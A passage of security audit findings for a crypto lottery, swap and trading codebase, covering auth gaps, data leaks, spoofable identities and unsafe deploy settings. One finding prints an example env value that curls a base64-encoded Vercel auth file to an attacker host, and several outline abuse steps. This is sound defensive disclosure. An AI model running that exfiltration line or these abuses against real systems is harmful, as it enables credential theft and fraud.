A user can therefore connect wallet A for points, click Edit to unlink it, connect wallet B for another point event, and repeat with fresh EOAs. The point ledger is append-only and recordProviderUnlink only removes account_linked_methods rows; it does not claw back points or mark the provider as already awarded. This can inflate waitlist scores and referral passthrough rewards, which are incentive/lottery-relevant in this codebase.

title: WETH fee distribution is bricked by same-block share wrapping
description: In `_processWETHFees()`, the gauge deposits swapped creator coins into the vault and receives vault shares in the same transaction. `CreatorOVault._update()` records the gauge's `lastDepositBlock` on that mint and prevents transfers out until `withdrawDelayBlocks` has passed. The commit changed `_distributeVaultShares()` so the lottery and voter slices are immediately passed to `_wrapVaultSharesToShareOft()`, which calls `wrapper.wrap()`. The wrapper pulls those freshly minted vault shares with `safeTransferFrom(msg.sender, address(this), amount)`, causing a vault share transfer from the gauge to the wrapper in the same block as the deposit. With the default nonzero cooldown, this transfer reverts with `TransferTooSoon`, reverting the entire WETH processing transaction. As a result, WETH fees from the tax-hook/native path remain stuck in `pendingWETHFees` unless the vault cooldown is disabled or the distribution flow is redesigned to defer wrapping until a later block.

title: Remote OFT messages can forge lottery entries
description: This commit added forwarding of remote lottery-entry messages in CreatorShareOFT._lzReceive. The discriminator only checks that the payload is 160 or 192 bytes and that the first ABI word is uint16(MSG_TYPE_LOTTERY_ENTRY). Standard OFT messages are also delivered to this same _lzReceive path and include user-controlled fields such as the recipient/compose payload, so they can collide with this weak custom-message format instead of being passed to super._lzReceive for normal OFT handling. Once forwarded, CreatorLotteryManager.receiveRemoteLotteryEntry only checks that msg.sender is an authorized hub ShareOFT forwarder; unlike the direct LotteryManager _lzReceive path, it does not verify authorizedRemoteOFTs[srcEid][originSender]. _handleLotteryEntry then trusts the decoded buyer/tokenIn/amount and can request VRF based on the attacker-supplied amount. An attacker able to send a crafted message through a legitimate remote OFT peer can create lottery entries that are not tied to an actual buy fee or queued pending entry, repeatedly farming jackpot payouts for only messaging/dust costs.

title: Unverified trading wallet can skew vigilante rankings
description: Previously, Hyperliquid metrics for leaderboard scoring were taken from the creator address. This commit adds `resolveHyperliquidAddress()`, which prefers `lookupRoomTradingWalletHint(roomId)` over the onchain creator address. That hint is read directly from raw snapshot/explore fields such as `tradingWallet`, `walletAddress`, `portfolioWallet`, and `hyperliquidWallet`, and the only validation is EVM address syntax. There is no ownership proof, creator/profile binding check, allowlist, or signature verification before the chosen address is passed into `getHyperliquidSnapshot()`. Because the resulting PnL/account value is ranked and may drive Lens scorecards and ERC-8004 feedback, a room creator or compromised/untrusted ingest source could attribute another wallet's Hyperliquid performance to their room and obtain undeserved protocol-issued reputation signals.

title: Public key-safety API leaks wallet balance data
description: The new `/api/v1/alfaclub/key-safety-room` endpoint is unauthenticated, allows `Access-Control-Allow-Origin: *`, accepts a `tradingWallet` query parameter, and returns the full room context. That context uses the caller-provided `tradingWallet` as the highest-priority treasury wallet, queries DeBank Cloud through the server-side access key and Hyperliquid for that wallet, and returns `debankTotalUsd`, `hyperliquidAccountValueUsd`, `totalTreasuryUsdc`, and `tradingWalletAddress` in the JSON response. The existing `key-safety-club-risk` endpoint was also changed to expose the same room-resolution path when `roomId` is supplied. As a result, any unauthenticated user can use any valid room id as a carrier to query aggregated balance data for arbitrary EVM addresses and consume the service's external API quota. Additionally, when no explicit/snapshot wallet is configured, the resolver reads `public.profiles.primary_embedded_eoa` for the room creator and can return/query that embedded EOA as `tradingWalletAddress`, exposing a private profile-wallet correlation that other public code paths intentionally avoid.

title: X verifier trusts user-writable linked identities
description: The commit adds POST `/api/waitlist/x-engagement`, which calls `verifyAndAwardWaitlistTwitterEngagementStep` for the authenticated Privy user. That function reads the user's Twitter identity directly from `account_linked_methods`, accepts any row with `type = 'twitter'`, and does not require `verified = true` or compare the row against the freshly fetched Privy user object used for authentication. Existing RLS policies allow public authenticated users to insert or update their own `account_linked_methods` rows with arbitrary `type`, `value`, and `verified` values. An attacker who can write their own row can insert `type='twitter'` and `value='<numeric X user id that follows @4626fun>'`, then POST `{ "step": "follow" }`. The server will verify that spoofed X account follows the target and award `x_engagement_follow` points to the attacker's Privy profile.

title: Unverified session limiter enables DB write amplification
description: This commit changes /api/accounts/me and /api/onboarding/bootstrap from IP-only durable rate limits to enforceDualRateLimit. The helper explicitly reads Privy token material without verifying the JWT, hashes it into a session-scoped key, and calls the provided durable limiter for that session key before checking the IP key. Because checkDurableRateLimit performs an INSERT/UPSERT into the agent_rate_limits table for every key it checks, an unauthenticated attacker can send requests with arbitrary X-Privy-Token or Authorization: Bearer values and create a fresh DB row per request before the IP rate limit is evaluated. Once the IP bucket is exhausted, rotating the fake token still causes the session-key DB write to happen on every rejected request. This undermines the stated goal of limiting amplification before auth/DB work and can be used as a database write/storage DoS against these public endpoints. A safer pattern is to check the IP bucket first, use a verified principal/session identifier for the session bucket, or avoid durable writes for attacker-supplied unverified session keys until the IP bucket has passed.

title: Public docs expose raw/internal audit transcripts
description: The new docs configuration adds the Fable transcript tree to the curated public documentation allowlist. The generated transcript index advertises a downloadable raw JSONL archive, and the exporter copies the original extracted `4626` transcript tree into a static ZIP while noting that the Markdown pages omit tool outputs and system context for readability. The committed Markdown transcripts already contain sensitive operational details such as production API-key rotation, token-tail identifiers, Vercel/Railway secret handling, and direct Supabase token-row writes. Publishing the complete raw JSONL archive is riskier because it can include the omitted tool outputs/system context, which are exactly where shell command output, environment dumps, logs, tokens, and internal paths often appear. This creates an unauthenticated information leak on the public docs site and should be replaced with a reviewed/redacted audit report rather than raw agent transcripts.

title: Unverified share mint can drive Solana pool provisioning
description: The deploy-session API preserves `solanaOvault.shareMeshMint` from the client payload, and the changed continue flow now uses that value to enqueue post-deploy Solana/Meteora provisioning. The keeper provisioning path then treats a provided `shareMeshMint` as authoritative, bypasses lookup of an existing `solana_share_mesh_mappings` row for the creator, and sends that mint directly to the external create-pool provisioner. Although the caller needs deploy-session authentication and the creator must have the Solana entitlement, a malicious entitled creator can submit a custom API request with an arbitrary Solana public key as `shareMeshMint`. After a legitimate deploy reaches the OVault mesh gate, the server will persist that arbitrary mapping and queue pool creation for it. This can corrupt ShareOFT-to-Solana-mint mappings, overwrite pending mint-scoped keeper jobs through the new mint-only dedupe key, and spend protocol Solana provisioner resources creating pools for attacker-selected or victim mints. The mint should be derived from trusted onchain/orchestrator state, or the provided mint must be verified against an applied mapping for the exact creator/shareOft before enqueueing or provisioning.

title: Public waitlist stats leaks recent member identities
description: The commit changed `/api/waitlist/stats` from returning only avatar URLs to returning `src`, `label`, and `href` for recent waitlist members. The handler is a public GET endpoint with no session or authorization check. It selects Zora handles, basenames, canonical smart wallet addresses, and external primary wallets for recent profiles and includes full addresses in Basescan links. This exposes identity/wallet linkage and recent signup activity for waitlist users to any network caller. The previous implementation explicitly avoided returning address, handle, or identity data.

title: Public leaderboard leaks external wallet addresses
description: The waitlist leaderboard endpoint is a public GET route: it resolves an optional principal only to populate the caller's `me` row, but still returns the leaderboard to unauthenticated callers. This commit adds `eoaAddress` to every leaderboard row, selects `profiles.primary_wallet` as `primary_wallet_raw`, converts it into `eoa_address` whenever no canonical CSW exists, and returns it in the JSON response. As a result, anyone can page through `/api/waitlist/leaderboard` and enumerate full primary wallet addresses, tied to waitlist membership, rank, points, badges, and labels, for users who previously appeared as anonymous `user#<id>` rows when they lacked a CSW. The UI also uses the leaked EOA as the Basescan link target. This exposes wallet metadata and account-to-waitlist linkage beyond the intended public identity surface.

title: WSL dry-run exposes local API server on the LAN
description: In WSL, dev-deploy-dry-run.sh now sets VITE_DEV_SERVER_HOST=true by default, which resolve_vite_host_arg maps to 0.0.0.0 and passes to `pnpm exec vite --host`. This is not just a static frontend server: vite.config.ts always installs localApiRoutesPlugin during `serve`, and that plugin loads repo/frontend .env files into process.env for API handlers and dispatches any /api or /__api request without a loopback-only or Host/source-address check. The dry-run script also keeps DB-backed routes enabled by default. As a result, a developer running the dry-run on WSL can unintentionally expose local API endpoints that use their database/API/RPC credentials to other hosts on the LAN or mirrored WSL network. A nearby attacker could call exposed routes to consume the developer's API quotas, exercise proxy endpoints, or interact with DB-backed waitlist/account/chat/dev endpoints under the developer's local configuration. The safer behavior is to keep localhost binding by default and require an explicit opt-in for LAN binding, or to reject non-loopback Host/source addresses for local API middleware and avoid loading real DB/secrets when binding to 0.0.0.0.

title: WSL dry-run exposes secret-backed dev API to LAN
description: Before this change, dev-deploy-dry-run.sh forced Vite to bind to localhost. The commit now sets VITE_DEV_SERVER_HOST=true automatically on WSL, resolves that value to 0.0.0.0, and starts Vite with --host 0.0.0.0. This is not just a static frontend: vite.config.ts installs localApiRoutesPlugin during serve, loads repo/root and frontend .env files into process.env, applies local server env, and dispatches /api/* to real Vercel-style handlers including deploy, keeper, paymaster, RPC, wallet, waitlist, and other secret-backed routes. The dry-run script also keeps DB env enabled by default. As a result, anyone who can connect to the WSL-exposed port from the Windows host or adjacent network can directly call those local API handlers, consume upstream API/RPC/paymaster quotas, trigger local dry-run/fork activity, and potentially interact with the developer's configured database or other operator-backed services. This changes the trust boundary from loopback-only to network-accessible without adding any dev-server authentication or non-loopback API guard.

title: Manual docs deploy can publish unreviewed refs
description: The commit moves docs production deployment into a standalone workflow and enables workflow_dispatch without any job-level ref restriction or protected environment approval. A user with permission to manually run repository workflows can select a non-main ref and the workflow will checkout that ref and run `vercel deploy --prod` using the production Vercel token. The previous deploy job was gated to push events on main/master and depended on the docs job. This creates a deployment-integrity bypass for docs.4626.fun: an unreviewed branch can be published to the production docs site, enabling phishing/brand abuse or malicious documentation content even if branch protection normally protects production changes.

title: DM fallback names can spoof verified chat identity
description: The updated chat identity hook now derives a Basename lookup from options.fallbackName and folds that result into basenameName even when a real peer EVM address is already known. The UI then displays dmIdentity.displayName for all DMs. Because fallbackName can come from non-authoritative hints such as the chatName deep-link parameter or other conversation hints, an attacker can craft a link that opens a DM to the attacker's address while displaying another user's Basename/display name and possibly avatar. The code does not verify that the Basename profile resolved from fallbackName belongs to the normalized peer address. Before this refactor, when a normalized address was present and no authoritative identity was found for that address, the display fell back to the shortened address rather than the supplied fallbackName, which reduced this spoofing risk.

title: Docs Vercel previews can run unreviewed code
description: The commit changes apps/docs-site/vercel.json from a configuration that used `ignoreCommand` plus `git.deploymentEnabled` to skip preview/non-main builds into one that only runs `pnpm install` and `pnpm run build:production`. The repository still contains scripts/vercel-ignore.sh with explicit controls to skip PR previews and non-main branches, but the new Vercel config no longer calls it. As a result, if the Vercel project is connected with default preview deployments enabled, a malicious PR or non-main branch update can cause Vercel to execute attacker-controlled repository code by changing package scripts, build tooling, or dependency lifecycle scripts. That code runs in the deployment environment and can exfiltrate configured Preview/Production environment variables or abuse deployment credentials/resources. This is especially risky because the removed script documents that PR preview builds were intentionally disallowed as defense-in-depth.

title: Arena backtest bypasses disable flag and can exhaust resources
description: The new `/arena backtest` subcommand is routed after only the approved-room check. Unlike the existing Arena operations, it does not call or honor the Arena enable validation (`ARENA_ENABLED`) and does not use the Arena command runner's dry-run/timeout controls. It immediately invokes `runRealBacktestJob`, which loads up to 90 days of market bars, performs local computation, and writes CSV/JSON artifacts to disk. A user who is authorized to use `/arena` in an approved room can therefore consume CPU, DB/network I/O, and disk even when operators believe Arena is disabled. Repeated chat commands can degrade service availability or fill the writable filesystem.

title: Repair script can leave Privy token dumps on failure
description: frontend/scripts/ops/alfaclub-repair-chat-token.ts reads a local Privy triplet containing identity, access, and refresh tokens, sets shouldDelete=true after validation, and documents that the file is deleted by default. However, the script calls process.exit(1) for failed seed, refresh, bridge, health, and catch paths. In Node.js, process.exit() terminates the process synchronously and does not wait for the async finally block, so deleteTriplet() is not run on those failure paths. A transient endpoint error or invalid bootstrap response therefore leaves the sensitive token dump on disk, increasing the chance of later disclosure through local compromise, backups, shell workspaces, or accidental handling.

title: Preset changes can orphan subaccount exit trades
description: The commit maps each preset to a Hyperliquid strategy subaccount and recomputes that mapping for every fill. An entry opened while the user is on one preset is submitted to that preset's subaccount. However, no per-position or per-entry record stores which subaccount was used. The existing opt-in flow allows the same sender to upsert a new preset, overwriting the stored preset. If the user opens a countered position, changes preset, and then closes or is liquidated, the runner resolves the new preset's subaccount for the exit. The exit flow checks for the bot leg only in that newly selected subaccount and records `exit_no_position` if it is absent, or may close a same-coin leg in the wrong sleeve. The original subaccount position remains open and unmanaged, defeating mirrored exits and potentially exposing strategy funds to liquidation or unwanted market risk. A fix should persist the strategy/subaccount used for each opened bot leg and route exits using that stored value, or otherwise search/close the matching leg across all configured subaccounts and prevent preset changes while routed positions are open.

title: Public backtest audit endpoint leaks server-side data
description: The commit adds `/api/v1/alfaclub/backtest-audit` as a public GET endpoint. It sets `Access-Control-Allow-Origin: *`, performs only IP-based rate limiting, and does not require an application session or any AlfaClub/owner authorization before reading CSV files from `tmp/backtests` or `frontend/tmp/backtests`. The response includes the parsed audit rows and also exposes server filesystem locations via `searchedDirs`, `resolvedDir`, and raw `error.message` values. This can disclose internal deployment paths and potentially strategy/backtest audit data to unauthenticated remote callers and arbitrary websites. Path traversal is mostly mitigated by basename validation, so the impact is limited to the intended backtest directories, but the data and path metadata are still exposed without an access decision.

title: Public room timeline leaks counter-trade ledger actions
description: The public `/v1/alfaclub/room-timeline` handler permits unauthenticated GET requests with arbitrary `roomId` and returns the built timeline with public CORS and public caching. This commit adds `readCounterTradeActionTimeline`, which reads `alfaclub.counter_trade_action_ledger` joined with `counter_trade_event_ledger` and converts executed counter-trade actions into returned `tradeEvents` including side, action classification, coin/market, leverage, notional, and margin. Unlike the live counter bot wallet fetches that are gated to room `1659`, this ledger read is called unconditionally for every requested roomId. If the ledger contains actions for non-public rooms or operational/testing rooms, an unauthenticated external caller can query those room IDs and learn counter-trade strategy timing and sizing.

title: Partial close can silently become a full close
description: The commit adds automated defense/harvest actions that intentionally submit partial reduce-only closes by passing `sizeUsd` to `runArenaTrade`. The higher-level defense code distinguishes partial closes from full closes and explicitly avoids full-closing healthy harvest winners. However, the patched `patches/dgclaw/trade.ts` initializes the order size to the full position size, converts the requested USD amount to asset units, and only changes the order to partial when the rounded asset size is greater than zero and less than the full position. If the requested partial close is below the asset's lot precision after `toFixed(meta.szDecimals)`, the code leaves `sz` as `fullSize` and submits a reduce-only order for the entire position. This can turn a small defense/harvest shave into an unintended full exit on high-priced or low-decimal markets, realizing losses or removing the hedge. A counter-traded user could choose or maintain positions in such markets and wait for defense/harvest triggers to force the bot to close materially more notional than the risk logic intended.

title: Counter-trade harvest endpoint leaks bot wallet PnL
description: The endpoint only verifies that a request has any valid auth session, then the new harvest branch resolves the Arena identity for the selected address and fetches Hyperliquid fills for both the user wallet and the bot wallet. If the caller is not opted in, selected falls back to the session address; identity resolution can then return a room default or env-default agent wallet. The response includes summarizeHarvestFills output, which contains the walletAddress plus realized PnL, fees, volume, and win/loss counts. As a result, any signed-in user can request /api/v1/alfaclub/counter-trade-status?harvest=1 and learn internal bot wallet telemetry that was not previously returned by this status endpoint. Because Hyperliquid fills are public once the wallet is known, the main leak is disclosure of the internal bot wallet mapping and operational trading metrics.

title: Mirrored exits can close unrelated bot positions
description: The commit adds automatic exit mirroring for Hyperliquid close/liquidation fills. The implementation only checks whether the bot currently has any open leg for the fill coin, then submits a full `close` for that pair. It does not verify that the bot leg is the expected opposite side of the user's exited side, nor that the position was opened by this counter-trade strategy. Because the underlying Arena close command is pair-only and full-position, a close/liquidation fill on the watched wallet can force-close an unrelated or manually opened bot position on the same market. The new path also intentionally bypasses cooldown, hourly/daily usage, and the LLM gate, so the usual entry risk controls do not limit this close action. This can cause unauthorized trading/account integrity loss through forced liquidation of strategy exposure, even though it does not directly withdraw funds.

title: Auto Zora swaps now allow 10% slippage by default
description: For canonical smart-wallet Zora routes, auto slippage is now forced to at least 10%. That value is fed into quote construction as the explicit slippage tolerance for Zora-preferred routes and is also used when preparing/finalizing Zora quotes. Because slippage tolerance determines the minimum acceptable output, a transaction submitted with a 10% tolerance can be executed after the pool price is moved almost 10% against the user. An attacker observing the transaction/user operation can sandwich or otherwise manipulate a thin creator-coin pool and extract substantially more value than the previous 5% bound. This is especially risky because the affected routes are creator/content coin pools, which are often thin and easier to move.

title: Telegram Mini App trusts AlfaClub relay bot token
description: The Mini App session endpoint previously verified Telegram initData only with the canonical TELEGRAM_BOT_TOKEN. This commit adds ALFACLUB_TELEGRAM_BOT_TOKEN as an alternate HMAC key and retries verification with it. That token is used elsewhere as the Hermit/AlfaClub relay bot token, a separate operational surface from canonical Telegram account linking. Once accepted, the resulting sessionToken is indistinguishable from a canonical Mini App session and is consumed by Telegram link completion and Zora CSW entry verification. This means compromise or mis-scoping of the lower-trust AlfaClub relay bot token can mint valid Telegram Mini App sessions for arbitrary Telegram identities, allowing unauthorized identity binding or verification flows that were intended to trust only the canonical link bot.

title: Untrusted deploy payload can overwrite Solana mint mappings
description: The commit introduces automatic persistence and keeper synchronization for Solana share-mesh mappings after OVault mesh confirmation. However, the deployment-session create path only copies solanaOvault.shareMeshMint from the request, and the OVault checks only verify that a post-phase-2 stage and a decodable finalizePhase2 call exist plus batcher/OFT wiring. They do not bind shareMeshMint to the creator token, ShareOFT, Solana creator config, or any server-provisioned mint. The continue path then upserts that mint with the decoded ShareOFT and queues a keeper sync. The mapping table is unique only by ShareOFT, not by Solana mint, and the orchestrator action unconditionally writes nextMapping[shareMeshMint] = shareOft. As a result, a low-privileged deployer who can create an OVault mesh deployment can choose an existing victim Solana mint and cause the orchestrator to overwrite SOLANA_SHARE_OFT_MAPPING for that mint. The Solana relay code later uses this mapping to assign pending entries to a ShareOFT and clears the Solana buffers after the Base relay succeeds, so overwritten mappings can misattribute or erase lottery entries and disrupt fee/bridge processing for the victim mint.

title: Pooled BEGIN/COMMIT corrupts account transaction isolation
description: Two new transaction helpers, `runBootstrapTransaction` and `withDbTransaction`, call `db.query('BEGIN')`, execute the callback with the original `db`, and then call `db.query('COMMIT')` or `ROLLBACK`. The repository's pooled `db.sql` and `db.query` implementations dispatch each statement via `activePool.query(...)`, not via a client checked out for the transaction. Therefore the callback is not bound to the same PostgreSQL client that received `BEGIN`. Under the default conservative serverless pool size of 1, any concurrent request sharing the same lambda instance can have its DB statements executed inside this open transaction and then committed or rolled back by the waitlist/bootstrap or wallet sync flow. With larger pools, some callback statements can run on different clients and not be covered by the transaction at all. The affected writes include account/profile bootstrapping, referral application, point awards, wallet rows, and canonical wallet flags. The codebase already has a correct `runInTransaction` helper that uses `pool.connect()` and a client-scoped `txDb`; these new wrappers should use that pattern instead of pool-level BEGIN/COMMIT.

title: Strategy status auto-provisions Arena identities
description: The new `autoProvisionArenaIdentityForStrategy` helper runs `runArenaCreateAgent`, stores the resulting Arena identity mapping, and then runs onboarding commands (`join`, `activate`, `add-api-wallet`). The `/strategy status` handler now invokes that helper whenever Arena is enabled and the caller lacks a mapped identity. However, `/strategy status` is explicitly not treated as an operator-only command; only `/arena`, `/signal`, and `/strategy bias` are blocked for non-operators in AlfaClub chat. As a result, a normal room user can trigger server-side ACP/dgclaw commands under the service's configured credentials and cause DB/external resource creation merely by requesting status. This bypasses the existing operator-only `/arena register` control path and can be abused for unauthorized provisioning/resource exhaustion. Status should remain read-only, or this auto-provisioning should require the same trusted-operator checks as `/arena register`/other write-capable Arena operations.

title: Salt override can bypass paid share vanity gating
description: This commit removes the active split Phase-1 batcher from the salt-disabled set by redefining `SPLIT_PHASE1_SALT_DISABLED_BATCHER` to an older batcher. As a result, nonzero `shareOftSaltOverride` values for the canonical v1.13.0 batcher are no longer forced to zero unless the live bytecode contains the disabled-error selector. The server does detect that salted Phase-1 calls contain a nonzero salt, but it waives paid share vanity entitlement when the request body says `vanity.shareSuffix` is the free default `4626`. It does not recompute the ShareOFT CREATE2 address for the submitted salt and verify that the address actually ends in `4626`, nor does it require entitlement for arbitrary client-supplied salts. The frontend also accepts `shareOftSaltOverride` from the URL/env and sends the default share suffix in the vanity request, making the bypass easy to trigger through normal deploy-session creation. An approved deploy user can therefore grind or choose any ShareOFT salt and obtain an unpaid custom ShareOFT address vanity, bypassing the paid `deploy_vanity_share_suffix_len_*` feature gate.

title: Zora retry can submit reduced swap amounts without consent
description: The new Zora retry path introduces an amount-downshift ladder for Coinbase Smart Wallet executions. When router simulation keeps failing due to slippage/liquidity, the client retries with 85% and then 70% of the originally reviewed input amount. This happens during submit-time preparation after the review state, and the send path immediately builds and submits the resulting transaction without requiring the user to review or approve the changed amount. A liquidity or price-manipulation attacker targeting a thin Zora pool could induce retryable simulation failures and cause victims to execute a materially smaller trade than they confirmed. The completion/activity record still uses params.amountInUnits, so the UI can also record the original amount rather than the actual reduced amount, making the discrepancy harder to notice.

title: ACP session owner can be caller-controlled during Arena create
description: runArenaCreateAgent previously only rotated the ACP CLI session when all ACP_ACCESS_TOKEN, ACP_REFRESH_TOKEN, and ACP_OWNER_WALLET were explicitly configured by the operator. The new fallback derives acpOwner from the ownerAddress argument when ACP_OWNER_WALLET is missing. The /arena register create path passes the requesting sender address into runArenaCreateAgent, so if service ACP tokens are configured but ACP_OWNER_WALLET is omitted, a permitted Arena caller can cause the server to run `acp configure --token <service token> --refresh-token <service refresh> --wallet <caller wallet>`. This allows a request-controlled identity to be paired with service-held ACP credentials and persisted in the local ACP CLI session, potentially creating or binding agents under an unintended owner and contaminating subsequent Arena operations. The safer behavior is to keep ACP_OWNER_WALLET mandatory whenever ACP token rotation envs are present, or require per-user ACP tokens with isolated CLI storage.

title: Arena dgclaw fallback bypasses configured command path
description: Previously, live Arena dgclaw operations resolved exactly ARENA_DGCLAW_DIR plus ARENA_DGCLAW_BIN and failed if that binary was absent. This commit adds fallback discovery for relative dgclawBin values: it probes dgclaw.sh and scripts/dgclaw.sh in the configured directory and then in a hardcoded /app/dgclaw-skill directory. ensureDgclawReady accepts any existing fallback, and buildDgclawCommand executes the resolved fallback for live /arena join, activate, and add-api-wallet commands. This can bypass an operator-configured wrapper binary. If ARENA_DGCLAW_BIN is intentionally set to a policy/logging/secret-scoping wrapper and that wrapper is stale or removed, authorized Arena command users can still trigger the raw fallback script with the service's runtime credentials instead of failing closed. The fallback should either be explicitly opted into, limited to the default bin configuration, or refuse to bypass a non-default configured command override.

title: Arena onboarding diagnostics can leak command secrets
description: The new onboarding diagnostic path includes `run.error`, `run.stderr`, and `run.stdout` from the `dgclaw` onboarding commands in the `/arena register` reply. Those child processes are executed with the full service environment inherited via `process.env`, plus Arena identity variables. The sanitizer only redacts the configured dgclaw directory and `ARENA_*=` assignments; it does not redact ACP tokens, Bearer/JWT values, API keys, private keys, or other long opaque secrets. Because the deterministic Hermit response is sent back into the AlfaClub room, a failing dgclaw script that prints its environment, config, auth headers, or verbose error output can disclose operational secrets to room members. Before this commit, the register flow only returned step status summaries such as `join=fail` and did not surface onboarding stdout/stderr.

title: Stale in-memory Arena identities bypass DB revocation
description: Arena identity mappings decide which Arena agent ID and wallet are used for subsequent /arena operations. The new fallback caches mappings in a module-level Map and resolves that cached entry before querying the database. If the database is unavailable, throws, or even returns no enabled row, the resolver returns the cached mapping. This means a mapping that was deleted or disabled in the database by another process/admin can continue to be used by this process until restart or a local clear. In addition, upsertArenaIdentityMapping now returns true and writes only to memory when getDb() is unavailable or when the DB write throws, making a mapping effective in the current process despite not being persisted or auditable in the DB. Since the resolved identity is copied into the Arena command config and then used for deposit/trade/join/onboarding commands, stale or failed-write mappings can route privileged Arena actions to an agent wallet no longer authorized by the source-of-truth database.

title: Client-controlled forceWrite bypasses CRE shadow mode
description: The commit adds shadow-mode environment controls intended to let operators ingest CRE attestations without executing writes. However, both the Solana NAV ingest endpoint and the creator oracle update endpoint accept a request-body `forceWrite` flag and use it to bypass `CRE_SOLANA_NAV_SHADOW_ONLY` / `CRE_ORACLE_SHADOW_ONLY`. In addition, the direct Solana NAV update endpoint only checks `CRE_SOLANA_NAV_WRITE_ENABLED` and the kill switch before signing `updateRemoteNav`, so it can be called directly while shadow mode is still enabled. This means any caller with `KPR_API_KEY` can defeat the operator's shadow-mode rollout guard whenever the corresponding write-enabled flag is on, causing the server to sign onchain NAV/oracle updates with `KPR_PRIVATE_KEY`. Because these endpoints are meant to accept external attestations during rollout, request-controlled bypasses of operator-controlled safety mode undermine the staged deployment guardrail.

title: Authenticated vanity endpoint enables CPU DoS
description: The commit adds `/api/deploy/vanity/per-vault-version`, which accepts attacker-controlled vanity prefixes/suffixes and init code, then runs a server-side brute-force search. The only access control is that some request principal exists; the authenticated address is not bound to the requested owner or to an active deployment session. If `maxAttempts` is omitted, the handler uses the server cap, whose default is 50,000,000 attempts and can be configured up to 500,000,000. An attacker with a low-privilege account can submit impossible or very high-difficulty targets, causing the server to spend substantial CPU in a synchronous WASM or TypeScript loop. Repeated requests can exhaust serverless/function CPU and degrade availability for other API routes.

title: Canonical swaps refresh quote after user confirmation
description: For non-Zora/non-CDP canonical swaps, executeSwapNow now invalidates the quote cache, fetches a fresh quote, rebuilds the swap transaction from that fresh quote, and submits it immediately. The user confirmation only checks whether the displayed quote is stale before calling executeSwapNow; it does not bind execution to the reviewed quote or enforce that the fresh quote's output/min-out is at least as favorable as the reviewed quote. A liquidity/price manipulation timed around submission could cause the app to execute a materially worse fresh quote than the one the user reviewed. The final completion state also records the pre-submit estimatedOut, reinforcing that the fresh quote output is not surfaced to the user before execution.

title: URL swap tokens are auto-marked verified
description: The swap page accepts token addresses from URL parameters and turns them into token options with `group: 'creator'` or `group: 'share'` but no `verified` field. Before this commit, those options defaulted to unverified unless they were core tokens. The new `resolveSwapTokenVerified` helper returns true for any creator/share group, so URL-injected arbitrary addresses are promoted to verified. Because the warning and confirmation flow only triggers when `option.verified === false`, a crafted `/swap?token=<malicious_token>` or share-token link can present an attacker-controlled token as trusted and allow the user to proceed directly to swapping into it. This weakens an existing anti-phishing/token-spoofing control and can lead to user asset loss if a victim follows a malicious link and signs the swap.

title: Live fallback can execute commands in the wrong AlfaClub room
description: With wsIngestAllRoomsEnabled enabled, the new WebSocket message path filters inbound messages against all configured poll rooms instead of only the socket's room. However, AlfaClubCommandMessage only stores id/date/sender/text and collectAlfaClubCommandMessages drops the roomId. The live fallback queue is global, and on an auth-fallback tick drainLiveCommands() passes all queued commands to executeCommandBatch with the current tick's roomId. executeCommandBatch then uses that current roomId for the deterministic executor chatId, reply target, reactions, follow-ups, and mark-read calls. As a result, a command sent in one configured AlfaClub room can be executed under another room's context and have the bot response posted there. This can leak command output to another room, let users affect room-scoped Hermit preferences/cooldowns for a room they did not send in, and let a member of one configured room induce bot posts in another configured room while live fallback is active.

title: Sampling disables keeper replay checkpoints
description: The Solana reconcile executor first checks keepr_workflow_checkpoints for a completed row and skips execution if it exists. The commit wraps the checkpoint upsert in shouldSampleEvent('keepr_workflow_checkpoints', ...). If the sampling decision is false, the upstream reconcile call can succeed but no completed checkpoint is written. Any later call with the same workflow/checkpointKey will not see prior completion and will call the Solana orchestrator again. These reconcile actions include bridge/fee/lottery-oriented operations, so losing this idempotency guard can cause duplicate relays, duplicate settlement attempts, or repeated winner/entry processing depending on orchestrator behavior. The same pattern is also applied to control_plane_stages: createControlPlaneStage may skip the INSERT but still return persisted: true, causing subsequent state transitions to silently no-op and making job lifecycle state unreliable.

title: Public Ethos diagnostics views expose DB query telemetry
description: The new migrations create public.ethos_expensive_chart_queries, public.ethos_index_usage, and public.ethos_unused_indexes in the Supabase-exposed public schema. public.ethos_expensive_chart_queries selects the raw query column from pg_stat_statements and exposes call counts/timing data for statements touching Ethos tables or chart tags. The new admin handler reads this data behind an admin session check and truncates query text to 180 characters, which indicates the data is intended to be admin-only. However, the underlying views are created directly in public and the migration does not revoke access from PUBLIC/anon/authenticated or move the views to a private schema. Since Supabase config exposes public through the generated API, this can leak SQL text, schema/table/index names, and performance characteristics to non-admin clients if default Supabase grants apply. Fix by moving these diagnostics to a non-exposed schema or explicitly revoking access from PUBLIC, anon, and authenticated, then serving them only through the admin API or an authenticated RPC.

title: Audit script sources env files as shell code
description: The new frontend/scripts/ops/audit-hermit-e2e.sh script defines load_local_env() and uses `source` on frontend/.env.local and frontend/.env. Environment files are data/configuration and may be generated by tools such as env-pull commands or edited by multiple operators; treating them as shell scripts means a malicious or compromised env value like `HERMIT_PINATA_CHAT_ENDPOINT=$(curl -fsS https://attacker/?t=$(cat ~/.config/vercel/auth.json | base64))` would execute before the intended checks. Because this runner is explicitly intended for operators and runs in a context that may have Vercel, Pinata, database, and other production credentials available, this can lead to local code execution and secret exfiltration. The script should parse KEY=VALUE records without evaluation, use an existing dotenv parser, or run commands through a tool that injects environment variables without shell evaluation.

title: Embedded EOA can execute from canonical CSW
description: The canonical CSW is described as the shared protocol identity used for profiles, XMTP, vault ownership, and user swap execution. Before this commit, the historical Privy embedded EOA was allowed only for legacy identity/profile resolution and was explicitly excluded from canonical4337/UserOp execution. The new policy adds that embedded EOA to CANONICAL_CSW_EXECUTION_OWNER_ADDRESSES, and both txRouter and the low-level ERC-4337 helper accept any signer passing isAllowedCanonicalCswExecutionSigner. As a result, a browser-accessible or otherwise compromised Privy embedded EOA/session can sign canonical CSW UserOps that pass the app's execution gate. Since the canonical CSW is also a vault owner/protocol identity and the ERC-4337 helper accepts arbitrary call arrays, this weakens the access boundary around high-impact onchain actions and can enable asset movement or administrative actions from the canonical CSW if the embedded signer is abused.

title: RLS dropped from public schema bootstrap migrations
